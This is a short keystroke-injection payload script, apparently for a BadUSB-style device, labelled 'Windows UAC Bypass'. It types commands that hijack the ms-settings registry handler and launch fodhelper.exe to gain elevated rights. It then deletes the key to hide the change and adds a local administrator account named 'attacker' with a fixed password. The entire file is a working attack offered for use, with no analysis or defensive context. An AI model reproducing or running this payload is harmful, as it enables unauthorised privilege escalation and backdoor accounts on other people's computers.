@id: bypass-uac
@name: Windows UAC Bypass
@description: Bypasses User Account Control on Windows systems
@category: windows
@severity: high
@param: TECHNIQUE | string | optional | UAC bypass technique (fodhelper|eventvwr|sdclt) | fodhelper

DELAY 1000
GUI r
DELAY 500
STRING cmd /c "reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d \"cmd.exe /c powershell -Command Start-Process cmd -Verb RunAs\" /f"
DELAY 300
ENTER
DELAY 1000
STRING reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /d "" /f
DELAY 300
ENTER
DELAY 500
IF_OS windows
  STRING fodhelper.exe
  DELAY 300
  ENTER
  DELAY 2000
  STRING reg delete HKCU\Software\Classes\ms-settings /f
  DELAY 300
  ENTER
  STRING whoami /priv
  DELAY 300
  ENTER
  STRING net user attacker P@ssw0rd123! /add 2>nul
  DELAY 300
  ENTER
  STRING net localgroup administrators attacker /add 2>nul
  DELAY 300
  ENTER
END_IF
DELAY 500
STRING echo UAC bypass complete
DELAY 300
ENTER
